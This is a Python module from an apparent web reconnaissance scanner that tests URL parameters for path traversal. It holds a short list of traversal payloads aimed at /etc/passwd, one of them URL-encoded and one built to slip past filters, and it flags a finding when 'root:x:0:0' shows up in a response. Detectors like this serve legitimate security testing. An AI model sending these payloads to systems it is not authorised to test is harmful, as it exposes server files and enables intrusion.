"""P2 — Path Traversal detector."""

from __future__ import annotations

from typing import Any, List

from godrecon.modules.base import Finding
from godrecon.utils.logger import get_logger

logger = get_logger(__name__)

_PATH_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//etc/passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "/etc/passwd",
]

_PATH_PATTERN = "root:x:0:0"


class PathTraversalDetector:
    """Detects Path Traversal vulnerabilities in URL parameters."""

    def __init__(
        self,
        http_client: Any,
        safe_mode: bool = True,
        max_payloads: int = 10,
    ) -> None:
        self.http = http_client
        self.safe_mode = safe_mode
        self.max_payloads = max_payloads

    async def scan(self, url: str, params: List[str]) -> List[Finding]:
        """Scan URL parameters for path traversal."""
        findings: List[Finding] = []

        for param in params:
            for payload in _PATH_PAYLOADS[: self.max_payloads]:
                try:
                    resp = await self.http.get(url, params={param: payload})
                    if not resp:
                        continue
                    body = resp.get("body", "") or ""
                    if _PATH_PATTERN in body:
                        findings.append(Finding(
                            title=f"Path Traversal — {url}",
                            description=(
                                f"Parameter '{param}' is vulnerable to path traversal. "
                                f"Payload: {payload}"
                            ),
                            severity="high",
                            confidence=0.95,
                            data={
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "method": "GET",
                            },
                            tags=["path-traversal", "p2", "high"],
                            evidence=f"'/etc/passwd' content detected in response",
                        ))
                        break
                except Exception as exc:
                    logger.debug("Path traversal scan error: %s", exc)

        return findings
